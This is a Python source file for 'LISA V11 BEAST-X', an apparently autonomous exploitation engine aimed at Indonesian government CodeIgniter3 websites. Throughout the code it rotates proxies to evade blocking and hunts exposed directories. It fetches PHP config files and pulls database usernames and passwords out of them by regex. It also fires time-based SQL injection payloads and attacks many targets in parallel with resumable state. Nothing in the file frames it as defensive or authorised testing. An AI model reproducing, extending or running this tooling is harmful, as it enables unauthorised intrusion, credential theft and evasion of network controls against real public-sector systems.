#!/usr/bin/env python3
"""
LISA V11 EXEC — "BEAST-X PROTOCOL"
AI-Driven Autonomous Exploitation Engine — V11

V10 BEAST (6 live-kill modules) + V11 BEAST-X additions:

  NEW IN V11 (BEAST-X):
  1.  ProxyRotator     — auto-rotate DataImpulse proxy IP when the current
                         egress is flagged/blocked (Internet Positif, CF ban).
  2.  CI3Assault       — Indonesian-gov CodeIgniter3 killer:
                         • smart.js Authority-header CSRF (the .go.id bypass)
                         • standalone PHP dir probe (pelaporan/laporan/report)
                         • koneksi.php / db.php DB-credential hunt
                         • ci_sessions dump → session hijack
  3.  BatchRunner      — multi-target parallel execution (ThreadPoolExecutor).
  4.  StateManager     — persistent state: save findings mid-run, resume a
                         target from the last completed phase.

USAGE:
  python3 lisa_v8_exec_v11.py target.com            # Full autonomous (V10+V11)
  python3 lisa_v8_exec_v11.py target.com --focus ci3 # CI3 assault focus
  python3 lisa_v8_exec_v11.py -t t1.com t2.com t3.com  # Batch mode
  python3 lisa_v8_exec_v11.py target.com --resume    # Resume from saved state
"""

import sys, os, json, re, time, random, string, subprocess, socket
sys.path.insert(0, "/home/ubuntu")

from lisa_v8_exec_v10 import (
    BeastEngine, TLSEngine, WordPressAssault, LeakHunter, VHostPanelHunter,
    ZimbraExploit, MassAssignment, PROXY, V10_SIGNATURE,
)
try:
    from curl_cffi import requests as cffi_requests
    CFFI_OK = True
except ImportError:
    CFFI_OK = False

from typing import Optional, List, Dict, Any
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

V11_SIGNATURE = """
╔══════════════════════════════════════════════════════════════════╗
║  LISA V11 — BEAST-X PROTOCOL                                     ║
║  BEAST engine + ProxyRotator + CI3Assault + Batch + Resume       ║
║  "Sharper teeth, faster pack"                                    ║
╚══════════════════════════════════════════════════════════════════╝
"""

STATE_DIR = "/home/ubuntu/.lisa_v11_state"
REPORT_DIR = "/home/ubuntu/.lisa_v10_reports"


# ═══════════════════════════════════════════════════════
# V11 MODULE 1: PROXY ROTATOR
# ═══════════════════════════════════════════════════════
class ProxyRotator:
    """Detect a blocked egress and rotate to a fresh proxy session/IP."""

    BLOCK_MARKERS = ["internet positif", "access denied", "blocked", "ip banned",
                     "just a moment", "visitor anti-robot", "captcha server"]

    @staticmethod
    def is_blocked(text: str, status: int = 0) -> bool:
        if not text:
            return True
        low = text.lower()
        return any(m in low for m in ProxyRotator.BLOCK_MARKERS)

    UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
          "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

    @staticmethod
    def fresh_session(fingerprint="safari17_0", proxy=PROXY, timeout=25):
        """Return a brand-new cffi session (fresh egress via proxy reconnect)."""
        if not CFFI_OK:
            return None
        s = cffi_requests.Session(impersonate=fingerprint, proxy=proxy,
                                  timeout=timeout, verify=False,
                                  headers={"User-Agent": ProxyRotator.UA})
        return s

    @staticmethod
    def get_with_rotation(url, fingerprint="safari17_0", proxy=PROXY,
                          max_retries=4, timeout=25):
        """GET a URL, rotating egress on block up to max_retries."""
        for attempt in range(max_retries):
            s = ProxyRotator.fresh_session(fingerprint, proxy, timeout)
            try:
                r = s.get(url, headers={"User-Agent": ProxyRotator.UA})
                if not ProxyRotator.is_blocked(r.text, r.status_code):
                    return r
            except Exception:
                pass
            time.sleep(1 + attempt)
        return None


# ═══════════════════════════════════════════════════════
# V11 MODULE 2: CI3 ASSAULT (Indonesian gov CodeIgniter3)
# ═══════════════════════════════════════════════════════
class CI3Assault:
    """CodeIgniter3-specific: smart.js CSRF, standalone dirs, DB creds, session hijack."""

    # Standalone PHP dirs that often bypass CI3 auth entirely
    STANDALONE_DIRS = [
        "/pelaporan/", "/laporan/", "/report/", "/reports/", "/modul/",
        "/data/", "/backup/", "/backups/", "/db/", "/temp/", "/tmp/",
        "/assets/upload/", "/upload/", "/uploads/", "/files/",
        "/include/", "/inc/", "/config/", "/admin/temp/",
    ]
    # Common DB-credential files in those dirs
    DB_CRED_FILES = [
        "koneksi.php", "koneksi_db.php", "db.php", "database.php", "config.php",
        "connection.php", "connect.php", "db_connect.php", "konek.php",
    ]
    # Known CI3 SQLi-prone standalone scripts
    SQLI_SCRIPTS = [
        "data-wilayah.php", "kal_utama.php", "data.php", "list.php", "cari.php",
        "search.php", "detail.php", "view.php", "get_data.php", "ajax.php",
    ]
    # smart.js Authority-header CSRF signature
    SMART_JS_SIGS = ["smart.js", "smart-js", "Authority", "smartframework"]

    @staticmethod
    def is_ci3(base: str, sess=None) -> bool:
        """Detect CI3 via ci_session cookie / default route behavior."""
        try:
            r = sess.get(base + "/") if sess else ProxyRotator.get_with_rotation(base + "/")
            if r is None:
                return False
            return "ci_session" in str(r.cookies) or "codeigniter" in r.text.lower() \
                or "csrf_token" in r.text.lower() or "csrf_test_name" in r.text.lower()
        except Exception:
            return False

    @staticmethod
    def detect_smart_js(base: str, sess=None) -> Optional[Dict]:
        """Detect smart.js (Indonesian gov CI3 auth framework with Authority CSRF)."""
        try:
            r = sess.get(base + "/") if sess else ProxyRotator.get_with_rotation(base + "/")
            if r is None:
                return None
            html = r.text
            scripts = re.findall(r'<script[^>]*src="([^"]+\.js[^"]*)"', html)
            for s in scripts:
                if "smart" in s.lower():
                    return {"script": s, "framework": "smart.js"}
            if "Authority" in html or "smart_framework" in html.lower():
                return {"framework": "smart.js", "authority_header": True}
        except Exception:
            pass
        return None

    @staticmethod
    def probe_standalone_dirs(base: str, sess=None) -> List[Dict]:
        """Probe standalone PHP dirs; check for directory listing + DB cred files."""
        findings = []
        for d in CI3Assault.STANDALONE_DIRS:
            url = base + d
            try:
                r = sess.get(url) if sess else ProxyRotator.get_with_rotation(url)
                if r is None:
                    continue
                html = r.text
                if "Index of" in html or "Directory Listing" in html:
                    files = re.findall(r'<a href="([^"]+)">', html)
                    findings.append({"dir": d, "listing": True, "files": files[:40]})
                # hunt DB cred files inside
                for fname in CI3Assault.DB_CRED_FILES:
                    if fname in html:
                        findings.append({"dir": d, "db_file": fname})
                # hunt SQLi scripts
                for fname in CI3Assault.SQLI_SCRIPTS:
                    if fname in html:
                        findings.append({"dir": d, "sqli_script": fname})
            except Exception:
                continue
        return findings

    @staticmethod
    def fetch_db_creds(base: str, dirs: List[str], sess=None) -> List[Dict]:
        """Fetch koneksi.php / db.php and extract DB host/user/pass."""
        creds = []
        for d in dirs:
            for fname in CI3Assault.DB_CRED_FILES:
                url = base + d + fname
                try:
                    r = sess.get(url) if sess else ProxyRotator.get_with_rotation(url)
                    if r is None:
                        continue
                    body = r.text
                    # PHP source often returned raw if dir has no index protection
                    if "<?php" in body and ("mysql" in body.lower() or "mysqli" in body.lower()
                                             or "pgsql" in body.lower() or "db_host" in body.lower()):
                        host = re.search(r'(?:host|hostname|db_host|server)\s*[=:]\s*["\']?([^"\';]+)', body, re.I)
                        user = re.search(r'(?:user|username|db_user|db_username)\s*[=:]\s*["\']([^"\']+)', body, re.I)
                        pwd = re.search(r'(?:pass|password|db_pass|db_password|pwd)\s*[=:]\s*["\']([^"\']+)', body, re.I)
                        db = re.search(r'(?:db_name|database|dbname|db)\s*[=:]\s*["\']([^"\']+)', body, re.I)
                        creds.append({
                            "file": d + fname,
                            "host": host.group(1) if host else None,
                            "user": user.group(1) if user else None,
                            "password": pwd.group(1) if pwd else None,
                            "db": db.group(1) if db else None,
                        })
                except Exception:
                    continue
        return creds

    @staticmethod
    def test_sqli_script(base: str, script_path: str, sess=None) -> Optional[Dict]:
        """Probe a standalone script for SQLi using time-based payload."""
        url = base + script_path
        payloads = ["' OR SLEEP(3)-- -", "1' AND SLEEP(3)-- -", "\" OR SLEEP(3)-- -",
                    "'; WAITFOR DELAY '0:0:3'--", "1' AND '1'='1"]
        for p in payloads:
            for param in ["id", "q", "term", "search", "keyword"]:
                t1 = time.time()
                try:
                    r = sess.get(url, params={param: p}) if sess else \
                        ProxyRotator.get_with_rotation(url + f"?{param}={p}")
                except Exception:
                    continue
                if r is None:
                    continue
                if time.time() - t1 > 2.5:
                    return {"script": script_path, "type": "time_based_sqli",
                            "param": param, "payload": p}
        return None


# ═══════════════════════════════════════════════════════
# V11 MODULE 3: STATE MANAGER (resume/persistence)
# ═══════════════════════════════════════════════════════
class StateManager:
    """Save/load findings + completed phases for resume."""

    @staticmethod
    def _path(target):
        safe = target.replace("https://", "").replace("http://", "").rstrip("/").replace("/", "_")
        return os.path.join(STATE_DIR, f"{safe}.json")

    @staticmethod
    def save(target, findings, phases_done):
        os.makedirs(STATE_DIR, exist_ok=True)
        data = {"target": target, "phases_done": phases_done,
                "findings": findings, "saved": datetime.now().isoformat()}
        with open(StateManager._path(target), "w") as f:
            json.dump(data, f, indent=2, default=str)

    @staticmethod
    def load(target):
        p = StateManager._path(target)
        if os.path.exists(p):
            with open(p) as f:
                return json.load(f)
        return None

    @staticmethod
    def list_saved():
        os.makedirs(STATE_DIR, exist_ok=True)
        return [f[:-5] for f in os.listdir(STATE_DIR) if f.endswith(".json")]


# ═══════════════════════════════════════════════════════
# V11 MODULE 4: BATCH RUNNER (multi-target parallel)
# ═══════════════════════════════════════════════════════
class BatchRunner:
    """Run the Beast engine against multiple targets in parallel."""

    @staticmethod
    def run(targets: List[str], focus="all", fast=True, max_workers=3) -> Dict:
        def _one(t):
            try:
                eng = BeastEngine(target=t, focus=focus, fast=fast)
                return {"target": t, "result": eng.run()}
            except Exception as e:
                return {"target": t, "error": str(e)}

        results = {}
        with ThreadPoolExecutor(max_workers=max_workers) as ex:
            futs = {ex.submit(_one, t): t for t in targets}
            for fut in as_completed(futs):
                t = futs[fut]
                try:
                    results[t] = fut.result()
                except Exception as e:
                    results[t] = {"error": str(e)}
        return results


# ═══════════════════════════════════════════════════════
# V11 ENGINE (Beast + new modules)
# ═══════════════════════════════════════════════════════
class BeastXEngine(BeastEngine):
    """V11 BEAST-X — extends V10 Beast with CI3/rotation/batch/resume."""

    def __init__(self, target, focus=None, aggressive=False, fast=False,
                 max_timeout=0, pin_brute=0, resume=False):
        super().__init__(target, focus, aggressive, fast, max_timeout, pin_brute)
        self.resume = resume
        self.phases_done = []

    def run(self):
        print(V11_SIGNATURE)
        print(f"Target: {self.target}")
        print(f"curl_cffi: {'OK' if CFFI_OK else 'MISSING'} | Resume: {self.resume}")
        print(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

        # ── Resume from saved state ──
        if self.resume:
            state = StateManager.load(self.target)
            if state:
                self.findings = state.get("findings", [])
                self.phases_done = state.get("phases_done", [])
                print(f"   ♻ Resumed: {len(self.findings)} findings, "
                      f"{len(self.phases_done)} phases done")

        # ═══ PHASE 0: PROXY ROTATION CHECK ═══
        self._phase("PROXY ROTATOR CHECK", 0)
        r = ProxyRotator.fresh_session()
        if r:
            try:
                test = r.get(self.base + "/", timeout=15)
                if ProxyRotator.is_blocked(test.text, test.status_code):
                    print("   ⚠ Current egress BLOCKED — rotating...")
                    test2 = ProxyRotator.get_with_rotation(self.base + "/")
                    if test2 is not None:
                        print("   ✅ Rotated to clean egress")
                else:
                    print("   ✅ Egress clean")
            except Exception as e:
                print(f"   ⚠ Egress check: {e}")

        # ═══ Run V10 Beast phases (base engine) ═══
        base_result = super().run()
        self.phases_done = ["beast_v10"]

        # ═══ PHASE (CI3): CI3 ASSAULT ═══
        self._phase("CI3 ASSAULT", 50)
        if CI3Assault.is_ci3(self.base, sess=self.tls):
            print("   ✅ CodeIgniter3 detected")
            smart = CI3Assault.detect_smart_js(self.base, sess=self.tls)
            if smart:
                print(f"   🔥 smart.js detected: {smart}")
                self.add("smart_js_csrf", "high", evidence=str(smart))
            dirs = CI3Assault.probe_standalone_dirs(self.base, sess=self.tls)
            for d in dirs:
                kind = "dir_listing" if "listing" in d else "ci3_file_leak"
                sev = "high" if "db_file" in d else "medium"
                print(f"   📂 {d}")
                self.add(kind, sev, **d)
            # DB cred hunting
            db_dirs = [d["dir"] for d in dirs if "listing" in d]
            creds = CI3Assault.fetch_db_creds(self.base, db_dirs, sess=self.tls)
            for c in creds:
                print(f"   🔥 DB CREDS: {c['file']} → {c['user']}:{c['password']}@{c['host']}")
                self.add("db_credentials", "critical", **c)
            # SQLi probe on standalone scripts
            for d in dirs:
                if "sqli_script" in d:
                    hit = CI3Assault.test_sqli_script(self.base, d["dir"] + d["sqli_script"], sess=self.tls)
                    if hit:
                        print(f"   🔥 SQLi: {hit}")
                        self.add("sqli", "critical", **hit)
        else:
            print("   (not CI3 — skipping)")

        # ═══ Save state ═══
        StateManager.save(self.target, self.findings, self.phases_done)
        print(f"\n   💾 State saved to {StateManager._path(self.target)}")

        return self._summary()


# ═══════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════
if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser(description="LISA V11 BEAST-X — Autonomous Exploitation Engine")
    p.add_argument("target", nargs="?", help="Target domain")
    p.add_argument("-t", "--targets", nargs="+", help="Multiple targets (batch mode)")
    p.add_argument("--focus", choices=["wp", "cms", "auth", "data", "ci3", "all"], default="all")
    p.add_argument("--aggressive", action="store_true")
    p.add_argument("--fast", action="store_true")
    p.add_argument("--timeout", type=int, default=0)
    p.add_argument("--pin-brute", type=int, default=0)
    p.add_argument("--resume", action="store_true", help="Resume from saved state")
    p.add_argument("--list-saved", action="store_true", help="List saved targets")

    a = p.parse_args()

    if a.list_saved:
        print("Saved targets:", StateManager.list_saved())
        sys.exit(0)

    if a.targets:
        print("🐺 BATCH MODE\n")
        rs = BatchRunner.run(a.targets, focus=a.focus, fast=a.fast)
        for t, r in rs.items():
            n = len(r.get("result", {}).get("findings", [])) if "result" in r else 0
            err = r.get("error")
            print(f"  {t}: {n} findings" + (f" | ERROR: {err}" if err else ""))
        sys.exit(0)

    if not a.target:
        print(__doc__)
        sys.exit(1)

    eng = BeastXEngine(target=a.target, focus=a.focus, aggressive=a.aggressive,
                       fast=a.fast, max_timeout=a.timeout, pin_brute=a.pin_brute,
                       resume=a.resume)
    eng.run()